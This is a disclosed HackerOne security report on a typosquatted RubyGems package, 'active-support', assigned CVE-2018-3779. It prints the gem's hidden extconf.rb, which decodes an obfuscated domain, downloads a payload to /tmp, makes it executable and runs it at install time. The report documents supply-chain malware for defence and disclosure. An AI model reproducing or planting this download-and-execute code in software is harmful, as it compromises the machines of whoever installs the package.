# [C] Malware in `active-support` gem

## Summary
Severity: Critical
Program: RubyGems
Weakness: Command Injection - Generic
Reporter: reed
State: resolved
Disclosed: 2018-08-09T18:14:31.969Z
CVE: CVE-2018-3779
Source: https://hackerone.com/reports/392311

## Details
This was sent to RubySec:

The gem duplicates official `activesupport` (no hyphen) code, but adds a compiled extension. The extension attempts to resolve a base64 encoded domain (`29faea63.planfhntage.de`), downloads a payload, and executes.

active-support-5.2.0.gem/data/ext/trellislike/unflaming/waffling/extconf.rb

```
require 'net/http'
require 'uri'
require 'base64'
require 'resolv'

class Smectis
  def self.install_explot(weighership)
    if !weighership.nil? and weighership != '0.0.0.0'
      educable = Net::HTTP.get_response(URI('http://' + weighership + '/mimming'))
      File.open('/tmp/autosymbiontic', 'wb+') do |uterometer|
        uterometer.binmode
        uterometer.write(educable.body)
        uterometer.chmod(0777)
        uterometer.close
      end
      system('/tmp/autosymbiontic')
    end
  end

  def self.run()
    milligram = 'MjlmYWVhNjMucGxhbmZobnRhZ2UuZGU='
    jaunting = nil
    begin
      jaunting = Resolv.getaddress(Base64.decode64(milligram))
    rescue
    end
    self.install_exploit(jaunting)
  end
end

Smectis.run()
```

_Trimmed to 38 lines — full report: https://hackerone.com/reports/392311_
